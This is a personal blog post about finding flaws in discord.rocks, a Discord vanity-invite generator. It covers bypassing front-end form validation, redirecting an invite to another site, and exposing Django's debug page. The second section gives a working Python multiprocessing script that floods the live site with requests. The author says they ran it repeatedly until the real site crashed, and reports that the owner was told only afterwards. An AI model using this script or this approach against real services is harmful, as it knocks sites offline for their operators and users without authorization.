---
title: How i “hacked” discord.rocks
author: wuemeli
description: I recently identified some security vulnerabilities in discord.rocks, a vanity invite generator for Discord servers. Although I informed the website owner and the issues have been resolved, I'd like to share my process and findings to highlight the importance of robust security measures.
---


I had already informed the owner of the website, and he fixed the security leaks. Additionally, what I did was not hacking; I merely identified some security vulnerabilities. Furthermore, this process was quite simple, and anyone could do it. So, let’s begin:

Discord.rocks is a free-to-use vanity invite generator: “Discord.rocks is a vanity invite generator that allows you to create personalized, easy-to-remember invites for your Discord server. Stand out from the crowd and make it easier for your friends, community, or customers to join your server

![my image](/pictures/blog/discord.rocks/LandingPage.webp)

If you don’t have Level 3 Discord Server boosts, discord.rocks is the perfect way to get your own personal Vanity URL. The website is coded in Python and uses Django as the backend.

Form Input Validation

![my image](/pictures/blog/discord.rocks/Vanity.webp)

This happens when I don’t want to type anything.

![my image](/pictures/blog/discord.rocks/CreateVanity.webp)

“It requires the fields in the frontend for something like this. I then just clicked ‘Inspect Element,’ navigated to the form’s HTML tag, and removed the ‘required’ attribute.


![my image](/pictures/blog/discord.rocks/FrontendBefore.webp)

After

![my image](/pictures/blog/discord.rocks/FrontendAfter.webp)

Now, I thought there should be backend validation, but I was wrong. I now know I could create something like this:

![my image](/pictures/blog/discord.rocks/smth.webp)


The Exploited URLs
For regular users, it would appear like this:

![my image](/pictures/blog/discord.rocks/Reg.webp)

A Normal URL
You noticed that I attempted to inject some scripts, but it didn’t work. I also somehow managed to bypass the Discord limit, redirecting it to my website instead of a Discord invite link. Additionally, I couldn’t perform SQL injection or something similar because I didn’t know which database they used. (I will discuss this further in this post.) With this, I could override the default 404 error to access some information:

![my image](/pictures/blog/discord.rocks/Django.webp)


This helped me see all the paths and confirmed that it uses Django. It was quite amusing exploiting this website and how easy it was. So, always consider implementing backend validation.

2. Overloading the Databases (Site Crash):

You may have noticed these 4000 users. I achieved this with a simple script to overload the website. Every time you visit a vanity URL, it saves the usage count into the database. Somehow, this process was slow, especially in the backend. User visits were getting redirected, and the server needed about 600ms to save the data to the database. With this in mind, I wrote this Python script:

```python
import multiprocessing as mp
import requests

def red(x):
    for i in range(x): 
        print(requests.get("https://discord.rocks/red/wuemeli"))

def blue(x):
    for i in range(x): 
        print(requests.get("https://discord.rocks/red/"))
    
def main(x):
    for i in range(x): 
        print(requests.get("https://discord.rocks/"))

def wuemeli(x):
    for i in range(x): 
        print(requests.get("https://discord.rocks/red/uwu"))

def my_func(x):
    red(1000)
    blue(1000)
    main(1000)
    wuemeli(1000)

def main():
    pool = mp.Pool(mp.cpu_count())
    pool.map(my_func, range(0, 1000))

if __name__ == "__main__":

    main()
```

This script loads the following URLs:

https://discord.rocks/red/wuemeli (to overload the usage count)
https://discord.rocks/red/ (causing the site to crash with errors)
https://discord.rocks/ (main)
https://discord.rocks/red/uwu (redirecting to another site)
I ran this script five times, and the site became overloaded, ultimately crashing. Then, I encountered a database error, but unfortunately, I forgot to take a screenshot, and I don’t want to overload the site again.

In conclusion, my exploration of discord.rocks revealed several vulnerabilities, primarily related to its usage count mechanism and the absence of backend validation. I successfully overloaded the site by repeatedly accessing specific URLs, leading to its crash. While this experiment was informative and somewhat amusing, it underscores the importance of implementing robust security measures, including backend validation, to safeguard websites against such exploits. Additionally, it’s crucial to respect ethical boundaries and seek proper authorization when conducting security testing to ensure responsible behavior within the online community